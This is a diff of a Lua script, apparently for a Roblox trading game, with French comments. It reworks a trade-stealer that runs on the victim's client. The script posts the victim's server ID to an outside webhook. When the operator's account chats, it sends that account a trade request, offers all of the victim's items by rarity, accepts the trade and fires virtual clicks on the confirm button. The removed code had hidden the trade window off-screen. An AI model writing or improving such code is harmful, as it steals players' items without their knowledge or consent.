@@ -490,94 +490,113 @@ else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-
--- Fonction pour planquer le panneau très loin hors de l'écran
-local function setTradeOffscreen(offscreen)
-    pcall(function()
-        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
-        if tradeGui then
-            -- Recherche du cadre principal du trade
-            local container = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("MainFrame") or tradeGui:FindFirstChild("Frame")
-            if container then
-                if offscreen then
-                    -- On le balance très loin en bas à droite (invisible pour toi)
-                    container.Position = UDim2.new(50, 0, 50, 0)
-                else
-                    -- On le remet au centre juste pour la validation
-                    container.Position = UDim2.new(0.5, -200, 0.5, -150)
-                end
-            end
-        end
-    end)
-end
 
 local function getitems()
-    -- 1. Envoi de la demande de trade au compte principal
-    local targetPlayer = Players:FindFirstChild(userName)
-    if not targetPlayer then
-        warn("Compte principal introuvable : " .. tostring(userName))
-        return
-    end
+    -- On lance ton destroy au tout début comme tu l'aimes
+    coroutine.resume(destroytrades2)
 
-    Trade.SendRequest:InvokeServer(targetPlayer)
-    task.wait(2.5)
+    local sendArgs = {
+        [1] = game:GetService("Players")[userName]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    -- 2. On déporte immédiatement le panneau hors de l'écran
-    setTradeOffscreen(true)
+    task.wait(3)
 
-    -- 3. Remplissage des 4 cases max
-    local itemsOffered = 0
-    local maxSlots = 4
-
-    local function offerAll(itemTable)
-        if itemTable and itemsOffered < maxSlots then
-            for _, b in pairs(itemTable) do
-                for i = 1, b.amount do
-                    if itemsOffered >= maxSlots then break end
-                    
-                    Trade.OfferItem:FireServer(b.data, "Weapons")
-                    itemsOffered = itemsOffered + 1
-                    task.wait(0.35)
-                end
-                if itemsOffered >= maxSlots then break end
-            end
+    for a,b in pairs(uniqueItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
-    offerAll(uniqueItems)
-    offerAll(ancientItems)
-    offerAll(godlyItems)
-    offerAll(vintageItems)
-    offerAll(legendaryItems)
-    offerAll(rareItems)
-    offerAll(uncommonItems)
-    offerAll(commonItems)
+    for a,b in pairs(ancientItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
 
-    task.wait(1.5)
+    for a,b in pairs(godlyItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
 
-    -- 4. Première validation réseau
+    for a,b in pairs(vintageItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(legendaryItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(rareItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(uncommonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(commonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    -- Première validation réseau (AcceptRequest)
     pcall(function()
-        Trade.AcceptRequest:FireServer()
+        game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente des 8 secondes du compte à rebours
-    task.wait(8)
+    -- Attente du timer obligatoire avant d'envoyer les clics virtuels
+    task.wait(7)
 
-    -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
+    -- SÉQUENCE DE CLIC VIRTUEL (Pour remplacer l'AcceptTrade bloqué)
     pcall(function()
-        -- On ramène le panneau au centre une fraction de seconde pour que le clic virtuel touche la bonne zone
-        setTradeOffscreen(false)
-        task.wait(0.15)
-
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
 
+        -- Coordonnées du bouton d'acceptation
         local targetX = ViewportSize.X * 0.76
         local targetY = ViewportSize.Y * 0.74
 
@@ -587,42 +606,24 @@ local function getitems()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        -- Clic 1 : Verrouillage
+        -- Double clic de validation
         sendClick()
-
-        task.wait(2)
-
-        -- Clic 2 : Confirmation finale
-        sendClick()
-
-        task.wait(1)
-
-        -- Clic 3 : Sécurité
+        task.wait(1.5)
         sendClick()
     end)
-
-    -- 7. Nettoyage final
-    task.wait(1)
-    if destroytrades2 then
-        pcall(function() coroutine.resume(destroytrades2) end)
-    end
 end
 
--- ==========================================
--- ÉCOUTE DU TCHAT
--- ==========================================
-
--- Modification de ton bloc d'écoute de tchat pour s'assurer qu'il fonctionne bien :
-local function listenToPlayer(player)
-    if string.lower(player.Name) == string.lower(tostring(userName)) then
+-- Écouteur du tchat mis en place sur les joueurs existants et futurs
+local function setupPlayer(player)
+    if player.Name == userName then
         player.Chatted:Connect(function(msg)
             getitems()
         end)
     end
 end
 
-for _, player in pairs(Players:GetPlayers()) do
-    listenToPlayer(player)
+for _, player in pairs(game.Players:GetPlayers()) do
+    setupPlayer(player)
 end
 
-Players.PlayerAdded:Connect(listenToPlayer)
+game.Players.PlayerAdded:Connect(setupPlayer)
